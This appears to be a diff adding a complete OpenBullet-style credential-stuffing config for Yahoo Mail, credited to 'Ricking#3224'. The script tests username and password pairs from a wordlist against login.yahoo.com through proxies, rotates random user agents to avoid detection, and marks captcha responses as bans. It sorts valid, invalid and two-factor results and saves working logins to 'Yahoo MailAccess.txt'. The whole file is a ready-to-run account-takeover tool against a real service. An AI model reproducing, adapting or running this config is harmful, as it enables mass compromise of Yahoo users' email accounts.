@@ -1,0 +1,144 @@
+[SETTINGS]
+{
+  "Name": "Yahoo",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-26T18:21:23.3798935-05:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Credentials",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<USER>" Contains "@yahoo" 
+  KEYCHAIN Failure OR 
+    KEY "<USER>" DoesNotContain "@yahoo" 
+
+SET VAR "one" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
+SET VAR "two" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+SET VAR "three" "Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1"
+SET VAR "four" "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36"
+SET VAR "five" "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36"
+SET VAR "six" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
+SET VAR "seven" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
+SET VAR "ListUA" "<one>|<two>|<three>|<four>|<five>|<six>|<seven>"
+
+#Split UTILITY Variable "ListUA" Split "|" -> VAR "UA" 
+
+#MyRandomUA UTILITY List "UA" Random -> VAR "MyRandomUA" 
+
+#EncodeUSER FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#EncodePASS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#Get REQUEST GET "https://login.yahoo.com/" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Referer: https://www.google.com/" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: <MyRandomUA>" 
+
+#acrumb PARSE "<SOURCE>" LR "\"acrumb\" value=\"" "\"" -> VAR "acrumb" 
+
+#sessionIndex PARSE "<SOURCE>" LR "sessionIndex\" value=\"" "\"" -> VAR "sessionIndex" 
+
+#Length FUNCTION Length "acrumb=<acrumb>&sessionIndex=<sessionIndex>&username=<US>&passwd=&signin=Next" -> VAR "Length" 
+
+#LoginEmail REQUEST POST "https://login.yahoo.com/" 
+  CONTENT "acrumb=<acrumb>&sessionIndex=<sessionIndex>&username=<US>&passwd=&signin=Next" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "bucket: mbr-phoenix-gpst" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: <Length>" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Origin: https://login.yahoo.com" 
+  HEADER "Referer: https://login.yahoo.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: <MyRandomUA>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"messages.ERROR_INVALID_USERNAME" 
+  KEYCHAIN Success OR 
+    KEY "{\"error\":false" 
+
+#URL PARSE "<SOURCE>" JSON "location" -> VAR "URL" 
+
+IF "<URL>" Contains "recaptcha"
+SET STATUS BAN
+ELSE
+SET STATUS SUCCESS
+ENDIF
+
+#Login REQUEST POST "<URL>" 
+  CONTENT "crumb=czI9ivjtMSr&acrumb=<acrumb>&sessionIndex=QQ--&displayName=<US>&passwordContext=normal&password=<PS>&verifyPassword=Next" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 1420" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Origin: https://login.yahoo.com" 
+  HEADER "Referer: https://login.yahoo.com/" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: <MyRandomUA>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid password. Please try again" 
+  KEYCHAIN Success OR 
+    KEY "Manage Accounts" 
+    KEY "Sign Out" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "For your safety, choose a method below to verify that" 
+  
+
+
+#Save_as_Patch UTILITY File "Yahoo MailAccess.txt" AppendLines "<USER>:<PASS>" 
